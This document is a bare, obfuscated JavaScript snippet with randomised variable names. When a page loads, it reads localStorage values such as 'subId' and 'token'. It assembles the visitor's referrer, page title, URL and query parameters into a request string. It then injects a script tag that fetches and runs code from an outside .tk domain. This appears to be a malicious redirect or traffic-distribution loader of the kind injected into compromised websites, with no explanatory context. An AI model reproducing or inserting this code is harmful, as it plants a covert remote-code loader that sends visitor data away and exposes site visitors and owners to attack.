   (function() {
    var name = '_2HWjjWkQP6vbXWkb';
    if (!window._2HWjjWkQP6vbXWkb) {
        window._2HWjjWkQP6vbXWkb = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://guivediwimbpagbezz.tk/37cHBrxx',
            P_PATH: 'https://guivediwimbpagbezz.tk/fec84ce/postback',
        };
    }
    const _p9tB8jMYN1n7FL1X = localStorage.getItem('config');
    if (typeof _p9tB8jMYN1n7FL1X !== 'undefined' && _p9tB8jMYN1n7FL1X !== null) {
        var _4mcNzLWMYFht1SJY = JSON.parse(_p9tB8jMYN1n7FL1X);
        var _N3ffWnzLDQw6G6cV = Math.round(+new Date()/1000);
        if (_4mcNzLWMYFht1SJY.created_at + window._2HWjjWkQP6vbXWkb.ttl < _N3ffWnzLDQw6G6cV) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _PXcsVzHdtBSDB54D = localStorage.getItem('subId');
    var _gFQKyVvpwhQDTCQC = localStorage.getItem('token');
    var _Spn5zy668myM97bt = '?return=js.client';
        _Spn5zy668myM97bt += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _Spn5zy668myM97bt += '&se_referrer=' + encodeURIComponent(document.referrer);
        _Spn5zy668myM97bt += '&default_keyword=' + encodeURIComponent(document.title);
        _Spn5zy668myM97bt += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _Spn5zy668myM97bt += '&name=' + encodeURIComponent(name);
        _Spn5zy668myM97bt += '&host=' + encodeURIComponent(window._2HWjjWkQP6vbXWkb.R_PATH);
    if (typeof _PXcsVzHdtBSDB54D !== 'undefined' && _PXcsVzHdtBSDB54D && window._2HWjjWkQP6vbXWkb.unique) {
        _Spn5zy668myM97bt += '&sub_id=' + encodeURIComponent(_PXcsVzHdtBSDB54D);
    }
    if (typeof _gFQKyVvpwhQDTCQC !== 'undefined' && _gFQKyVvpwhQDTCQC && window._2HWjjWkQP6vbXWkb.unique) {
        _Spn5zy668myM97bt += '&token=' + encodeURIComponent(_gFQKyVvpwhQDTCQC);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._2HWjjWkQP6vbXWkb.R_PATH + _Spn5zy668myM97bt;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
